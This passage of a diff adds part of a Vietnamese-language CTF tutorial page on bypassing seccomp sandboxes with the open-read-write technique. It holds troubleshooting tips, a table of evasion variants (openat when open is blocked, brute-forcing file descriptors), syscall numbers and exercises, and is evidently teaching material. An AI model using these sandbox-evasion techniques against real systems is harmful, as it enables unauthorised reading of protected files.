+    <div class="card"><h4>SIGSYS / Bad system call</h4><p>Gọi syscall bị cấm. Dump lại, tránh syscall đó.</p></div>
+    <div class="card"><h4>open trả -1</h4><p>Sai tên/đường dẫn flag. Thử /flag, flag.txt.</p></div>
+    <div class="card"><h4>read 0 byte</h4><p>fd sai (không phải 3) hoặc rdx=0. Set rdx=0x40.</p></div>
+    <div class="card"><h4>không in gì</h4><p>write rdi≠1 hoặc buf sai. rdi=1 stdout.</p></div>
+    <div class="card"><h4>open cấm</h4><p>Dùng openat(257), AT_FDCWD=-100.</p></div>
+    <div class="card"><h4>shellcode chết</h4><p>NX bật → ROP thay. Hoặc rdx set sai len.</p></div>
+  </div>
+ </div>
+</section>
+
+<!-- 10 Biến thể -->
+<section class="block" id="s10">
+ <div class="wrap">
+  <div class="secnum">10 / BIẾN THỂ & NHẬN DIỆN</div>
+  <h2>ORW theo điều kiện</h2>
+  <div class="tablewrap"><table>
+    <thead><tr><th>Ràng buộc filter</th><th>Cách ORW</th></tr></thead>
+    <tbody>
+      <tr><td>Chỉ cấm execve</td><td>ORW open/read/write bình thường</td></tr>
+      <tr><td>Cấm open(2)</td><td>openat(257) hoặc open_by_handle</td></tr>
+      <tr><td>Cấm write(1)</td><td>dùng <code>puts</code>/sendfile, hoặc write ra stderr(2)</td></tr>
+      <tr><td>Whitelist chặt</td><td>chỉ dùng syscall ALLOW; đôi khi <code>pread</code>/<code>sendfile</code></td></tr>
+      <tr><td>Chỉ ALLOW read/write/exit, cấm open</td><td>flag đã mở sẵn fd? brute fd 3..10 với read</td></tr>
+    </tbody>
+  </table></div>
+  <div class="note"><span class="tag">Kiến trúc</span><b>x86 (32-bit):</b> syscall number KHÁC (open=5, read=3, write=4, execve=11), gọi qua <code>int 0x80</code>, tham số qua ebx/ecx/edx. <b>ARM64:</b> openat=56, read=63, write=64, svc #0. seccomp-tools tự hiện đúng theo arch.</div>
+ </div>
+</section>
+
+<!-- 11 -->
+<section class="block" id="s11">
+ <div class="wrap">
+  <div class="secnum">11 / LUYỆN TẬP</div>
+  <h2>Bài tập tăng dần</h2>
+  <div class="ex"><div class="level">⭐⭐ · ORW shellcode</div><p>Vùng RWX, cấm execve. shellcraft.cat("/flag").</p></div>
+  <div class="ex"><div class="level">⭐⭐⭐ · ORW ROP</div><p>NX. Dựng 4 syscall read/open/read/write.</p></div>
+  <div class="ex"><div class="level">⭐⭐⭐⭐ · open cấm</div><p>Chuyển openat(257), AT_FDCWD=-100.</p></div>
+ </div>
+</section>
+
+<!-- 12 -->
+<section class="block" id="s12">
+ <div class="wrap">
+  <div class="secnum">12 / THUẬT NGỮ & ĐỌC THÊM</div>
+  <h2>Tra cứu nhanh</h2>
+  <div class="grid">
+    <div class="card"><div class="term">seccomp</div><p>Kernel lọc syscall.</p></div>
+    <div class="card"><div class="term">BPF</div><p>Chương trình quyết ALLOW/KILL.</p></div>
+    <div class="card"><div class="term">SIGSYS</div><p>Giết khi gọi syscall cấm.</p></div>
+    <div class="card"><div class="term">ORW</div><p>open+read+write đọc flag.</p></div>
+    <div class="card"><div class="term">openat</div><p>nr 257, thay open khi bị cấm.</p></div>
+    <div class="card"><div class="term">fd</div><p>open trả, bắt đầu từ 3.</p></div>
+  </div>
+  <h3>Đọc thêm</h3>
+  <ul>
+    <li>Dựng chuỗi: <a href="rop_basics.html">ROP</a> · <a href="ret2csu.html">ret2csu</a> (set rdx) · <a href="ret2shellcode.html">shellcode</a> · <a href="ret2syscall_mprotect.html">mprotect</a> (tạo RWX chạy shellcode ORW).</li>
+    <li><code>man 2 seccomp</code> · seccomp-tools (david942j) · shellcraft ORW.</li>
+  </ul>
+ </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <p><strong>Phase 5 · Sandbox.</strong> Seccomp cấm execve → không mở shell. ORW = open("/flag")+read(fd,buf)+write(1,buf) đọc flag tay. Dump filter trước (seccomp-tools), dựng bằng shellcode (RWX) hoặc ROP/syscall (NX).</p>
+    <p style="margin-top:6px;opacity:.7">Chỉ dùng cho học tập và CTF hợp pháp.</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var btn=document.getElementById("themeBtn");
+  function cur(){var a=document.documentElement.getAttribute("data-theme");if(a)return a;return window.matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light";}
+  btn.addEventListener("click",function(){var n=cur()==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",n);try{localStorage.setItem("seccomp-theme",n);}catch(e){}});
+  try{var s=localStorage.getItem("seccomp-theme");if(s)document.documentElement.setAttribute("data-theme",s);}catch(e){}
+
+  var KILL={59:"execve",322:"execveat",57:"fork"};
+  var NAMES={0:"read",1:"write",2:"open",3:"close",10:"mprotect",59:"execve",60:"exit",257:"openat",322:"execveat",57:"fork"};
+  var nrIn=document.getElementById("nrIn"),v=document.getElementById("scVerdict");
+  function chk(){
+    var n=parseInt((nrIn.value||"").trim(),10);
+    if(isNaN(n)){v.className="verdict";v.textContent="nhập số";return;}
+    var nm=NAMES[n]||("syscall "+n);
+    if(KILL[n]){v.className="verdict kill";v.innerHTML="✗ "+nm+" (nr "+n+") → <b>KILL · SIGSYS</b> — tiến trình CHẾT. Tránh syscall này.";}
+    else{v.className="verdict allow";v.innerHTML="✓ "+nm+" (nr "+n+") → <b>ALLOW</b> — chạy được. Dùng cho ORW nếu là open/read/write.";}
+  }
+  document.getElementById("chkBtn").addEventListener("click",chk);
+  nrIn.addEventListener("keydown",function(e){if(e.key==="Enter")chk();});
+  nrIn.addEventListener("input",chk);chk();
+
+  var tabs=[].slice.call(document.querySelectorAll("#tabs .tab"));
+  var panels={a:document.getElementById("panel-a"),b:document.getElementById("panel-b"),c:document.getElementById("panel-c")};
+  tabs.forEach(function(t){t.addEventListener("click",function(){
+    tabs.forEach(function(x){x.classList.remove("active");});t.classList.add("active");
+    Object.keys(panels).forEach(function(k){panels[k].hidden=(k!==t.getAttribute("data-t"));});
+  });});
+})();
+</script>
